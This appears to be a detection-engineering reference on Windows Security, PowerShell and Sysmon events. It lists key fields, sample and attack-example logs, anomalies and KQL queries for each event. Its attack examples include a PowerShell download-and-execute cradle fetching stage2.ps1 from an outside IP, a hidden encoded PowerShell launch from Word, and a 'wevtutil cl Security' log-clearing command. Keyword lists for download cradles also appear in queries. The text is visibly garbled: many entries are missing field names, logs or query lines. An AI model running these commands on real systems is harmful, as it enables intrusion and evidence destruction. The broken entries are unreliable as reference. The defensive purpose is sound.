	Account Name:		svc_helper02
	Account Domain:		CORP
	Logon ID:		0x9A11E15
	Logon GUID:		{00000000-0000-0000-0000-000000000000}
	Special Groups Assigned:	CORP\Domain Admins

investigation_steps: Check whether the account is a known, documented tier-0 administrator; if not, treat this with the same urgency as an unexpected 4732 into a privileged group.
Pull the matching 4624 for the Logon ID to see how and from where the session was established.
Cross-reference against recent 4728/4732 events to see when and by whom the account was added to the watched group.
false_positives: Routine logons by legitimate tier-0 administrators once Special Groups auditing is first enabled, which can produce a burst of expected events
events.detection_query:
SecurityEvent
| where EventID == 4964
| where TargetUserName !in (KnownTier0Accounts)  // maintain as a watchlist
related_attacks: Backdoor account elevation confirmation
Insider privilege abuse investigations

events.name: A new process has been created
events.description: Logged whenever a process starts. With command-line auditing enabled via Group Policy, the full command line used to launch the process is included, one of the single highest-value events for endpoint detection.

key_fields.meaning: Full path of the process that was just launched.
The exact arguments the process was launched with, if command-line auditing is enabled; often the single most decisive field.

key_fields.field: Process Information > Creator Process Name / Creator Process ID
key_fields.meaning: The parent process (and its PID) that spawned this one, used to build the process tree.
The account the process ran as.
Whether the process ran with a full admin token (%%1937), a limited token (%%1936), or the default token (%%1938).

events.normal_baseline: Very high volume; every process launch on every host generates one. Most are routine OS and application activity.
events.sample_log:
A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-3623811015-3361044348-30300820-1104
	Account Name:		jsmith
	Account Domain:		CORP
	Logon ID:		0x3F2A891

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1f90
	New Process Name:	C:\Windows\System32\notepad.exe
	Token Elevation Type:	%%1938
	Mandatory Label:	Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x1a4c
	Creator Process Name:	C:\Windows\explorer.exe
	Process Command Line:	notepad.exe C:\Users\jsmith\Documents\notes.txt
anomalies: LOLBins such as powershell.exe, rundll32.exe, mshta.exe, certutil.exe, or regsvr32.exe launched with encoded, obfuscated, or download-cradle command lines
A process spawned from an unexpected parent, such as winword.exe spawning cmd.exe or powershell.exe
Process execution from a Temp, Downloads, or user-writable directory
Token Elevation Type indicating an unexpected privilege jump

attack_example.scenario: A phishing macro in a Word document spawns PowerShell with a Base64-encoded download-and-execute command, the classic initial-access-to-execution pattern.
attack_example.log:
A new process has been created.

Creator Subject:
	Security ID:		S-1-5-21-3623811015-3361044348-30300820-1104
	Account Name:		jsmith
	Account Domain:		CORP
	Logon ID:		0x3F2A891

Target Subject:
	Security ID:		S-1-0-0
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x2ff0
	New Process Name:	C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:	Mandatory Label\Medium Mandatory Level
	Creator Process ID:	0x2f88
	Creator Process Name:	C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
	Process Command Line:	powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...

investigation_steps: Read the full Process Command Line first; look for encoding flags, download cradles, or suspicious argument patterns before anything else.
Walk the Creator Process Name chain upward; an unexpected parent, such as an Office app spawning a shell, is a stronger signal than the child process alone.
Check the working directory embedded in New Process Name; execution from Temp, Downloads, or a user profile path is worth extra scrutiny.
Pull the matching 4689 to see how long the process ran and its exit status.
false_positives: Legitimate admin scripts and software installers that use PowerShell or cmd.exe with long, complex-looking command lines by design
Software update mechanisms that download and execute helper binaries into Temp as part of a normal patch cycle
Security tools themselves invoking LOLBins for legitimate scanning or remediation purposes
events.detection_query:
SecurityEvent
| where EventID == 4688
| where NewProcessName has_any ("powershell.exe","mshta.exe","certutil.exe","rundll32.exe","regsvr32.exe")
| where CommandLine has_any ("-enc","-EncodedCommand","IEX","DownloadString","hidden")
related_attacks: Fileless malware and LOLBin abuse
Initial-access payload execution, such as a phishing macro spawning a shell
Ransomware pre-encryption staging commands

events.name: A process has exited
events.description: Logged when a process terminates, recording its exit status. Pairs with the corresponding 4688 to bound a process's full lifetime.

key_fields.meaning: The process that just exited.
The PID, used to match this exit back to its originating 4688.
The process's return code; 0x0 is clean, nonzero can indicate a crash or forced termination.

events.normal_baseline: Expected for every process that was started; volume roughly matches 4688.
events.sample_log:
A process has exited.

Subject:
	Security ID:		S-1-5-21-3623811015-3361044348-30300820-1104
	Account Name:		jsmith
	Account Domain:		CORP
	Logon ID:		0x3F2A891

Process Information:
	Process ID:		0x1f90
	Process Name:		C:\Windows\System32\notepad.exe
	Exit Status:		0x0
anomalies: Rapid-fire process creation and exit cycles from the same binary in a short window, consistent with a loader or persistence check-in
Abnormal exit status codes on a security-relevant process, such as an antivirus or EDR process exiting unexpectedly

attack_example.scenario: A staging dropper writes its payload to disk, launches it, and exits within under a second, minimizing the window it exists as a running process.
attack_example.log:
A process has exited.

Subject:
	Security ID:		S-1-5-21-3623811015-3361044348-30300820-1104
	Account Name:		jsmith
	Account Domain:		CORP
	Logon ID:		0x3F2A891

Process Information:
	Process ID:		0x33a8
	Process Name:		C:\Users\jsmith\AppData\Local\Temp\update.exe
	Exit Status:		0x0

[matching 4688 shows launch time 400ms earlier]

investigation_steps: Use this mainly to bound a 4688's lifetime; a process that exits almost immediately after launching is more consistent with a loader or dropper than normal interactive use.
Check the Exit Status for anything other than a clean zero, especially on a security-relevant process.
false_positives: Short-lived helper processes and command-line utilities that are supposed to run briefly and exit, such as ipconfig or whoami
events.detection_query:
SecurityEvent
| where EventID == 4689
| join kind=inner (
    SecurityEvent | where EventID == 4688 | project NewProcessId, StartTime=TimeGenerated
) on NewProcessId
| extend LifetimeMs = datetime_diff('millisecond', TimeGenerated, StartTime)
| where LifetimeMs < 1000

Anti-forensic quick-exit malware behavior

events.description: Logged when a new service is installed, whether via sc.exe, PowerShell, an installer, or programmatically. Captures the service's binary path, which is often the fastest way to spot a malicious service.

key_fields.meaning: The internal name of the newly installed service.
Full path to the binary the service will execute; the single most important field for triage.

key_fields.field: Service Information > Service Type / Service Start Type
key_fields.meaning: What kind of service it is and whether it starts automatically (2), on demand (3), or is disabled (4).
The account that installed the service.

A service binary path containing an unusually long, obfuscated, or encoded command line

Endpoint management or RMM tooling that installs helper services as part of normal agent deployment

SecurityEvent
| where EventID == 4697

events.name: A scheduled task was created
events.description: Logged when a new scheduled task is registered via Task Scheduler, capturing the task's full XML definition, including the action to run and the trigger that fires it, one of the most common persistence mechanisms to monitor.

key_fields.meaning: The full scheduled-task path, e.g. \Acme\BackupSync\NightlyJob.
The task's complete raw XML definition: its triggers (when it runs) and actions (what it runs, with what arguments).
The account that created the task.

events.normal_baseline: Expected during software installs, Windows maintenance tasks, and administrator-scheduled jobs.
events.sample_log:
A scheduled task was created.

Subject:
	Security ID:		S-1-5-21-3623811015-3361044348-30300820-500
	Account Name:		jdoe.admin
	Account Domain:		CORP
	Logon ID:		0x4B7C102

anomalies: A task whose command or arguments in the XML reference PowerShell, mshta, rundll32, or a script in a Temp or user-writable path
Tasks created with hidden or highest-privilege run levels shortly after a suspicious logon or process execution
Task names designed to blend in with legitimate Windows scheduled tasks

attack_example.scenario: A task disguised with a Microsoft-sounding name runs a hidden, encoded PowerShell command every time any user logs on, re-establishing the attacker's foothold after reboot.
attack_example.log:

Cross-reference the Subject Account Name against expected task-scheduling admins or tools for this environment.
false_positives: Software installers and Windows Update creating maintenance tasks as part of normal setup
Legitimate backup, monitoring, or patch-management tools that register their own scheduled tasks on every managed endpoint
events.detection_query:
SecurityEvent
| where EventID == 4698
| where TaskContent has_any ("powershell","mshta","rundll32","cmd.exe /c")
related_attacks: Scheduled task persistence

Living-off-the-land persistence via Task Scheduler

key_fields.meaning: The scheduled task that was modified.
The task's new raw XML definition after the update.
The account that made the change.

events.normal_baseline: Expected during software updates and routine administrative task maintenance.

	Security ID:		S-1-5-21-3623811015-3361044348-30300820-500

An updated task action pointing to a Temp or user-writable path

key_fields.field: Network Information > Source Address / Source Port

anomalies: Access to administrative shares such as C$, ADMIN$, or IPC$ from a workstation that doesn't normally perform remote administration
A single source accessing many different hosts' shares in a short window, indicating lateral movement or share enumeration
Access to a sensitive file share outside an account's normal working hours or job function

attack_example.scenario: An attacker uses stolen admin credentials to connect to ADMIN$ on several servers in rapid succession from one workstation, staging a remote-execution tool for lateral movement.
attack_example.log:

Subject:

Backup and inventory or management agents that routinely enumerate shares across the fleet

The specific file or subfolder within the share that was requested.

key_fields.field: Access Request Information > Accesses / Access Mask
key_fields.meaning: The specific rights requested, e.g. ReadData, and the raw access mask value.
Whether each requested access right was granted or denied, and why.

events.name: The Windows Filtering Platform has allowed a connection
events.description: Logged by the Windows Filtering Platform, the engine behind Windows Firewall, when it permits a connection, recording both the local and remote endpoints and the process responsible.

key_fields.meaning: Full path of the process the connection is attributed to.

key_fields.field: Network Information > Source Address / Source Port
key_fields.meaning: The local endpoint of the connection.

key_fields.field: Network Information > Destination Address / Destination Port
key_fields.meaning: The remote endpoint the connection is going to.
The transport protocol number, e.g. 6 = TCP, 17 = UDP.

events.normal_baseline: Extremely high volume when enabled; most environments enable this selectively, for specific processes or hosts, rather than platform-wide, due to log noise.

Connections to destination IPs associated with known scanning, C2, or tunneling infrastructure
A sudden spike in unique destination ports from one host, indicating port scanning

attack_example.scenario: A backdoor beacons out to an attacker-controlled IP on a non-standard port at a fixed interval, from a process (rundll32.exe) that has no normal reason to make outbound internet connections.

	Process ID:		7744
	Application Name:	\device\harddiskvolume2\windows\system32\rundll32.exe

[repeats every 60 seconds with a near-identical byte count]

Look at destination port patterns; fixed, regular-interval connections to the same external IP and port are more consistent with C2 beaconing than normal application traffic.
Cross-reference the Application Name with a recent suspicious 4688 process creation.
false_positives: Legitimate applications with frequent background telemetry, update-check, or sync traffic, such as cloud storage clients or browsers
Overly broad WFP logging scope capturing routine, high-volume traffic that was never meant to be reviewed line-by-line

SecurityEvent
| where EventID == 5156 and Direction == "%%14593"  // Outbound
| summarize ConnCount=count(), DistinctPorts=dcount(DestPort) by Application, DestAddress, bin(TimeGenerated, 1h)

A newly-bound port matching a known reverse-shell or C2-framework default listener port

attack_example.scenario: A dropped implant binds a local listening port to accept follow-on tasking or a second-stage payload, from a process with no legitimate reason to act as a network server.

Correlate with a recent 4688 for the same process to see how it was launched.

Development or admin tools that intentionally bind a listener for remote debugging or file transfer

SecurityEvent

events.name: The audit log was cleared
events.description: Logged whenever the Security event log is cleared, and critically, this specific event survives the clearing operation, so the act of clearing is never itself erased. One of the strongest single indicators of anti-forensic activity.

key_fields.field: Subject > Security ID / Account Name / Domain Name
key_fields.meaning: The account credited with clearing the log.
Ties this event to the session that performed the clear, correlating with that session's own 4624.

events.normal_baseline: Rare. Legitimate log clearing is normally tied to a documented change-management action or log-rotation process, not routine day-to-day activity.
events.sample_log:
The audit log was cleared.

Subject:
	Security ID:		CORP\jdoe.admin
	Account Name:		jdoe.admin
	Domain Name:		CORP
	Logon ID:		0x4B7C102
anomalies: Any 1102 event outside a known, approved maintenance window should be treated as a high-priority alert
A 1102 event followed by a gap in expected log volume, or immediately preceded by suspicious process or logon activity that the clearing was meant to hide

attack_example.scenario: An attacker with local admin rights runs wevtutil cl Security after completing lateral movement and data staging, attempting to erase the evidence of everything that happened during the intrusion.
attack_example.log:
The audit log was cleared.

Subject:
	Security ID:		CORP\svc_backup
	Account Name:		svc_backup
	Domain Name:		CORP
	Logon ID:		0x9A11C40

[Security log shows no events between 02:47 and 02:51; the only surviving record of that window is this 1102 itself]

investigation_steps: Immediately identify the Subject and confirm whether that account or person had an approved, documented reason to clear logs at that time.
Check every other log source available, such as the System log, Sysmon, or any forwarded copy already in a SIEM, for the period the Security log would have covered.
Look immediately before the gap for the last events that did make it through, and immediately after for what activity resumes.
false_positives: Scripted log-rotation or disk-space-management jobs that clear logs on a schedule as an accepted, if risky, operational practice
A documented decommissioning or re-imaging step that intentionally wipes a system's logs before reuse

attack_techniques.name: Indicator Removal: Clear Windows Event Logs

related_attacks: Anti-forensic log clearing to cover tracks post-compromise
Ransomware pre-encryption cleanup
Insider threat evidence destruction

key_fields.meaning: The account that changed the audit policy (or the local computer account, if applied via Group Policy).

What the setting was changed to, e.g. Success removed, Failure removed.

events.name: The system time was changed
events.description: Logged whenever the system clock is changed, recording both the old and new time. A shifted clock can desynchronize Kerberos (which tolerates only a small skew) or make timeline reconstruction across a network harder.

key_fields.meaning: The account (or process) that changed the time.
The process that made the change, e.g. a time-sync service or a manual tool.

key_fields.field: Other Information > Previous Time / New Time
key_fields.meaning: The clock value before and after the change.

events.normal_baseline: Expected from the Windows Time service (w32time) making small periodic NTP corrections, and occasional daylight-saving adjustments.

The system time was changed.

	Security ID:		CORP\jdoe.admin
	Account Name:		jdoe.admin
	Account Domain:		CORP
	Logon ID:		0x4B7C102

Process Information:
	Process ID:		0xf28
	Name:			C:\Windows\System32\svchost.exe

Other Information:
	Previous Time:		2026-09-10T08:23:53.000Z
	New Time:		2026-09-10T08:23:54.100Z
anomalies: A large time jump (hours or days) rather than a small NTP correction
A time change immediately preceding or following other suspicious activity, potentially used to confuse log correlation or defeat time-bound access controls
The change made by an unexpected process rather than the Windows Time service

attack_example.scenario: An attacker rolls the system clock backward before executing malicious actions, then forward again afterward, attempting to make the malicious activity's timestamps land outside the window a responder is actively reviewing.
attack_example.log:
The system time was changed.

Subject:
	Security ID:		CORP\svc_backup
	Account Name:		svc_backup
	Account Domain:		CORP
	Logon ID:		0x9A11C40

	Process ID:		0x94c
	Name:			C:\Windows\System32\rundll32.exe

	Previous Time:		2026-09-10T02:45:00.000Z
	New Time:		2026-09-08T02:45:00.000Z

false_positives: Routine NTP synchronization corrections by the Windows Time service, normally only a few seconds

SecurityEvent
| where EventID == 4616
| extend ShiftSeconds = datetime_diff('second', todatetime(NewTime), todatetime(PreviousTime))
| where abs(ShiftSeconds) > 300

	Security ID:		SYSTEM
	Account Name:		DC01$
	Account Domain:		CORP
	Logon ID:		0x3E7

	KerMaxR (MaxRenewAge):	New Value: 0x7	Old Value: (none)

events.name: A user account was locked out
events.description: Logged when an account is locked out after exceeding the configured bad-password threshold. The Subject is always the local SYSTEM account of the machine that detected the lockout, not a human actor.

key_fields.field: Account That Was Locked Out > Account Name
key_fields.meaning: The account that got locked.
The workstation or server where the failed attempts that triggered the lockout actually landed, often the most useful field for tracing the source.

events.normal_baseline: Occasional, tied to a genuine user mistyping their password repeatedly or a stale cached credential retrying automatically.
events.sample_log:
A user account was locked out.

Subject:
	Security ID:		SYSTEM
	Account Name:		DC01$
	Account Domain:		CORP
	Logon ID:		0x3E7

Account That Was Locked Out:
	Security ID:		CORP\jsmith
	Account Name:		jsmith

Additional Information:
	Caller Computer Name:	WKS-FIN07
anomalies: A wave of 4740 events across many different accounts, indicating a brute-force or spray attack aggressive enough to trip lockout thresholds
Repeated lockouts on the same privileged or service account in a short period
A Caller Computer Name that isn't the account's normal workstation

attack_example.scenario: An aggressive password-spray tool triggers account lockouts across dozens of users, all tracing back to the same Caller Computer Name, a compromised jump host being used to launch the attack internally.
attack_example.log:
A user account was locked out.

Subject:
	Security ID:		SYSTEM
	Account Name:		DC01$
	Account Domain:		CORP
	Logon ID:		0x3E7

Account That Was Locked Out:
	Security ID:		CORP\r.diaz
	Account Name:		r.diaz

Additional Information:
	Caller Computer Name:	SRV-JUMP02

[repeated for l.chen, m.okafor, s.hassan, ... all citing the same Caller Computer Name]

investigation_steps: Use Caller Computer Name to trace back to the actual source of the failed attempts, then pull that host's own 4625 events for full detail.
Check whether many different accounts are locking out from the same Caller Computer Name in a short window, the signature of a spray attack aggressive enough to trip lockout.
Correlate with any 4771/4776 failures from the same source around the same time.
false_positives: A genuine user who forgot their password or has a stale cached credential on a phone or mapped drive retrying automatically
A misconfigured service or scheduled task using an outdated password
events.detection_query:
SecurityEvent
| where EventID == 4740
| summarize DistinctAccounts=dcount(TargetAccount) by CallerComputer, bin(TimeGenerated, 15m)
| where DistinctAccounts > 5
related_attacks: Password spraying and brute-force campaigns aggressive enough to trigger lockout policy
Denial-of-service via deliberate mass account lockout

events.name: A user account was unlocked
events.description: Logged whenever the Unlock Account checkbox is used on a user's account, whether or not the account was actually in a locked state at the time.

key_fields.meaning: The account that was unlocked.
The admin or helpdesk account that performed the unlock.

events.normal_baseline: Expected as a routine helpdesk action following a legitimate 4740 lockout.
events.sample_log:
A user account was unlocked.

Subject:
	Security ID:		CORP\jdoe.admin
	Account Name:		jdoe.admin
	Account Domain:		CORP
	Logon ID:		0x4B7C102

Target Account:
	Security ID:		CORP\jsmith
	Account Name:		jsmith
	Account Domain:		CORP
anomalies: An unlock performed by an account outside the designated helpdesk/IT group
An unlock with no corresponding recent 4740, since the checkbox can be used even on an account that wasn't actually locked

attack_example.scenario: An attacker who just locked out a target account through repeated guesses unlocks it themselves using stolen helpdesk credentials, to keep guessing without alerting the real user via a support ticket.
attack_example.log:
A user account was unlocked.

Subject:
	Security ID:		CORP\helpdesk_t2
	Account Name:		helpdesk_t2
	Account Domain:		CORP
	Logon ID:		0x9A11D02

Target Account:
	Security ID:		CORP\r.diaz
	Account Name:		r.diaz
	Account Domain:		CORP

events.name: A user account was deleted
events.description: Logged whenever a user account is deleted, capturing who deleted it and the target account's identity.

key_fields.meaning: The account that was deleted.
The account that performed the deletion.

events.normal_baseline: Expected during offboarding, tied to a documented IT or HR deprovisioning process.

Target Account:

	Account Name:		bob

A deletion immediately following suspicious activity on that same account, potentially covering tracks
Bulk deletion of multiple accounts in a short window

attack_example.scenario: An attacker deletes the backdoor account they created and used earlier in the intrusion, attempting to remove evidence of the persistence mechanism before the response team gets there.
attack_example.log:

events.description: Logged to the Microsoft-Windows-PowerShell/Operational log for each pipeline execution when Module Logging is enabled, recording the cmdlets and parameters used, though not always the full underlying script text the way 4104 does.

key_fields.meaning: The process that hosted the PowerShell engine, e.g. powershell.exe or a custom host.
The pipeline execution detail: the cmdlet name and parameter bindings used.

events.normal_baseline: Expected wherever PowerShell is actively used for administration; volume tracks admin and automation activity.

investigation_steps: Read the Command Name and Payload fields for reflection, encoding, or download-cradle patterns outside normal admin workflows.
Check for a missing paired 4104 event, which can indicate script block logging was deliberately disabled to hide the underlying code.
Correlate with the parent 4688 process creation to see how the PowerShell host itself was launched.
false_positives: Legitimate admin scripts and modules performing routine cmdlet invocations
Configuration-management tools (DSC, Ansible) generating high-volume module logging as part of normal operation
events.detection_query:

| where Source == "Microsoft-Windows-PowerShell" and EventID == 4103
| where RenderedDescription has_any ("Reflection.Assembly","Invoke-Expression","DownloadString","FromBase64String")

events.name: Script block logging
events.description: Logged when Script Block Logging is enabled and PowerShell executes a block of script, capturing the de-obfuscated script text itself, including code reconstructed from encoded or otherwise obfuscated commands. The single highest-value PowerShell event for detection.

key_fields.meaning: The actual de-obfuscated script content that ran.
The .ps1 file path, if the script block came from a file rather than an interactive command.
A GUID grouping all fragments of the same script block together, useful when a long script is split across multiple 4104 events.

events.normal_baseline: Routine for scheduled administrative scripts, Desired State Configuration, and management tooling.
events.sample_log:
Creating Scriptblock text (1 of 1):
Get-Process -Name explorer | Select-Object Id, Name

ScriptBlockId: 8c6e1e3a-1234-4a5b-9abc-1234567890ab
Path:
anomalies: Script blocks containing Base64-encoded payloads, -EncodedCommand usage, or Invoke-Expression combined with a download cradle (Net.WebClient, Invoke-WebRequest)
Script blocks referencing AMSI bypass patterns or reflection-based in-memory loading
A high volume of very short, rapidly generated script blocks consistent with a fileless loader

attack_example.scenario: An attacker runs an obfuscated, Base64-encoded download-and-execute one-liner; Script Block Logging reconstructs and logs the actual de-obfuscated command regardless of the encoding used to launch it.
attack_example.log:
Creating Scriptblock text (1 of 1):
IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.77/stage2.ps1')

ScriptBlockId: 4f8a2c11-9e77-4b12-8a3d-9988776655aa
Path:

investigation_steps: Read ScriptBlockText directly; this is de-obfuscated, so encoding or obfuscation used at launch time will not hide the payload here.
Look for download cradle patterns (Net.WebClient, Invoke-WebRequest, IEX) combined with an external IP or domain.
Use ScriptBlockId to reassemble multi-part script blocks if the full script was split across several 4104 events.
false_positives: Legitimate scheduled administrative scripts and DSC configurations that are long or programmatically generated
Package managers and module installers that dynamically build command strings as part of normal operation
events.detection_query:
Event
| where Source == "Microsoft-Windows-PowerShell" and EventID == 4104
| where RenderedDescription has_any ("DownloadString","IEX","-enc","FromBase64String","Invoke-Expression","hidden")
related_attacks: Fileless malware and obfuscated PowerShell payload execution
Living-off-the-land download-and-execute post-exploitation

events.name: Command started
events.description: Logged when a PowerShell command or cmdlet begins execution, part of the more verbose command-lifecycle logging in the Microsoft-Windows-PowerShell/Operational log, less commonly enabled than script block or module logging due to volume.

key_fields.meaning: The specific command that started.
The cmdlet or function name.
The account the command ran under.

events.normal_baseline: High volume when enabled; fires for every discrete command within a script or session, not just once per session.
events.sample_log:

CommandName = Get-Process
CommandType = Cmdlet
User = CORP\jsmith
ConnectedUser =
PipelineId = 1
RunspaceId = 8c6e1e3a-1234-4a5b-9abc-1234567890ab
SequenceNumber = 14
anomalies: Command Name values matching known credential-access or reconnaissance cmdlets running outside admin workflows
A very high rate of distinct commands starting in a short window, consistent with an automated post-exploitation script

attack_example.scenario: A reconnaissance script runs a rapid sequence of discovery cmdlets (Get-ADUser, Get-ADGroupMember, Get-NetTCPConnection) in quick succession, gathering environment information immediately after initial access.
attack_example.log:

CommandName = Get-ADGroupMember
CommandType = Cmdlet
User = CORP\svc_backup
ConnectedUser =

RunspaceId = 8c6e1e3a-1234-4a5b-9abc-1234567890ab

investigation_steps: Pair with 4106 (command stopped) using PipelineId to bound each command's execution window.
Look for a rapid sequence of discovery-oriented cmdlets run back-to-back by the same session.

events.detection_query:

| where Source == "Microsoft-Windows-PowerShell" and EventID == 4105

events.name: Command stopped
events.description: Logged when a PowerShell command or cmdlet finishes execution, the completion counterpart to 4105, letting an analyst bound exactly how long each individual command ran.

key_fields.meaning: The command that finished.
Matches the 4105 that started this same command, for duration calculation.

events.normal_baseline: Expected for every command that was started; volume matches 4105.

Commands stopping with no corresponding 4105, suggesting log tampering or truncation

attack_example.scenario: A command implementing a reverse-shell loop stays running for hours rather than completing normally, visible as an unusually long gap between its 4105 start and 4106 stop.

CommandName = ForEach-Object

User = CORP\svc_backup
ConnectedUser =
PipelineId = 7
RunspaceId = 8c6e1e3a-1234-4a5b-9abc-1234567890ab

investigation_steps: Match PipelineId back to the corresponding 4105 to compute the command's actual duration.
Flag durations far outside the norm for that command type.
Use alongside 4104 to see the full script text of any long-running or suspicious command.

events.detection_query:
Event
| where Source == "Microsoft-Windows-PowerShell" and EventID in (4105, 4106)
| summarize StartTime=minif(TimeGenerated, EventID==4105), StopTime=maxif(TimeGenerated, EventID==4106) by PipelineId, User

events.name: Process creation
events.description: Logged every time a new process is created, with full command line, hashes, and parent process context. This is the highest-value Sysmon event for execution-based detection because it captures what Task Manager and 4688 often don't: the exact command line and a stable ProcessGuid for correlating every later event this process generates.

key_fields.meaning: Full path of the executable that was launched.
Complete command line including arguments, the single most useful field for spotting encoded PowerShell, LOLBin abuse, or staged payload paths.
The process that spawned this one, needed to catch process-lineage anomalies like Office apps spawning shells.
SHA1/MD5/SHA256/IMPHASH of the executable, used for threat-intel matching and detecting known-bad binaries under new names.
Windows integrity level (Low/Medium/High/System) the process runs at; unexpectedly High/System levels can indicate privilege escalation.
The account context and logon session the process runs under, pivotable against Security-log logon events.

events.name: A process changed a file creation time
events.description: Logged when a process explicitly modifies a file's creation timestamp via SetFileTime or an equivalent API call, rather than the file simply being created. It helps recover the real creation time of a file after an attacker has altered it to blend in with legitimate system files.

key_fields.meaning: The file whose creation time was changed.
The new (falsified or legitimately updated) creation timestamp written to the file.
The creation timestamp the file had immediately before the change, useful for spotting large backdating jumps.
The process that performed the timestamp change.

events.normal_baseline: Generated by installers, archive extraction tools, backup/restore utilities, and file-sync clients that legitimately preserve or reset creation times during normal operation.
events.sample_log:
File creation time changed:
RuleName: -
UtcTime: 2026-09-10 09:11:04.220
ProcessGuid: {5d3a2c91-3a01-66f0-1102-000000000a00}
ProcessId: 3340
Image: C:\Windows\System32\7z.exe
TargetFilename: C:\ProgramData\Vendor\update-helper.exe
CreationUtcTime: 2019-03-14 02:00:00.000
PreviousCreationUtcTime: 2026-09-10 09:10:58.114
User: CORP\svc_backup
anomalies: CreationUtcTime backdated to a date years before PreviousCreationUtcTime, especially matching a Windows build date used to blend in
Timestomping applied to a file in a location where a backdoor or persistence mechanism was just dropped (event 11 immediately prior)
Repeated timestomping activity by the same process against multiple unrelated files in a short window

attack_example.scenario: Malware sets its own dropped executable's creation time to match kernel32.dll's timestamp, a classic timestomping move to defeat sort-by-creation-date triage.
attack_example.log:
File creation time changed:
RuleName: -
UtcTime: 2026-09-10 14:03:02.550
ProcessGuid: {5d3a2c91-2e13-66f0-4a02-000000000a00}
ProcessId: 9144
Image: C:\Users\k.patel\AppData\Local\Temp\svchost_update.exe
TargetFilename: C:\Users\k.patel\AppData\Local\Temp\svchost_update.exe
CreationUtcTime: 2019-12-07 05:14:32.000
PreviousCreationUtcTime: 2026-09-10 14:02:55.901
User: CORP\k.patel

investigation_steps: Compare CreationUtcTime against the file's LastWriteTime (via a follow-up file query); a creation date years older than the write date is a strong timestomp indicator.
Correlate ProcessGuid with the preceding Sysmon-11 FileCreate event for the same TargetFilename to see the file's true drop time.
Check whether Image itself was recently created or is running from a user-writable temp directory, since legitimate installers rarely operate from there.
false_positives: Archive extraction tools (7-Zip, WinRAR) that preserve original timestamps from the archive metadata
Backup and file-sync software (OneDrive, robocopy /MIR) restoring original creation times during a restore operation
events.detection_query:
Event
| where Source == "Microsoft-Windows-Sysmon" and EventID == 2
| extend AgeDays = datetime_diff('day', PreviousCreationUtcTime, CreationUtcTime)
| where AgeDays < -365
| project TimeGenerated, Computer, Image, TargetFilename, CreationUtcTime, PreviousCreationUtcTime
related_attacks: Anti-forensic timestomping to defeat timeline analysis
Backdoor staging disguised as legitimate system files
Living-off-the-land malware persistence in ProgramData

events.name: Network connection
events.description: Logs TCP and UDP connections initiated or received by any process, disabled by default because of volume. Each entry ties source and destination IP, port, and hostname directly to the initiating process, which the Windows Firewall log and most NetFlow data cannot do.

key_fields.meaning: The process that opened or accepted the connection.
true if this endpoint initiated the connection (outbound), false if it was the listener accepting an inbound connection.
Where the connection went, the resolved hostname if reverse DNS succeeded, and the destination port.
The ephemeral local port used, occasionally useful for correlating with a specific listener or NAT mapping.
tcp or udp.

events.normal_baseline: Extremely high volume on any monitored host: browsers, update services, cloud sync clients, and business applications all generate constant outbound connections.
events.sample_log:
Network connection detected:
RuleName: -
UtcTime: 2026-09-10 10:44:12.903
ProcessGuid: {5d3a2c91-4b02-66f0-2201-000000000a00}

SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 203.0.113.10
DestinationHostname: www.contoso-cdn.example
DestinationPort: 443
DestinationPortName: https
anomalies: A process with no legitimate networking role (notepad.exe, calc.exe, a Sysmon-flagged LOLBin) opening outbound connections
Beaconing pattern: the same Image connecting to the same DestinationIp at a fixed interval over a long duration
Connections to a DestinationIp with no resolvable DestinationHostname on a nonstandard high port
Outbound connections from lsass.exe, services.exe, or other processes that should never make network calls

attack_example.scenario: A PowerShell-based implant beacons out to a C2 server over HTTPS on a nonstandard port at a regular interval, a pattern typical of Cobalt Strike or similar frameworks.
attack_example.log:

investigation_steps: Baseline the Image against known legitimate network-facing processes for that host; flag anything unexpected making outbound calls.
Check connection cadence over time for the same ProcessGuid or Image/DestinationIp pair; fixed-interval beaconing is a strong C2 indicator.
Enrich DestinationIp against threat intel and WHOIS; a destination with no reverse DNS and recent domain registration raises suspicion.
false_positives: Legitimate cloud/SaaS applications that use nonstandard ports or lack reverse DNS for their CDN endpoints
Internal monitoring and health-check agents that poll on a fixed interval, mimicking beacon cadence
VPN and proxy software that funnels many processes' traffic through one connection-owning process

Event
| where Source == "Microsoft-Windows-Sysmon" and EventID == 3
| where Initiated == true and isempty(DestinationHostname)

| where ConnCount > 20
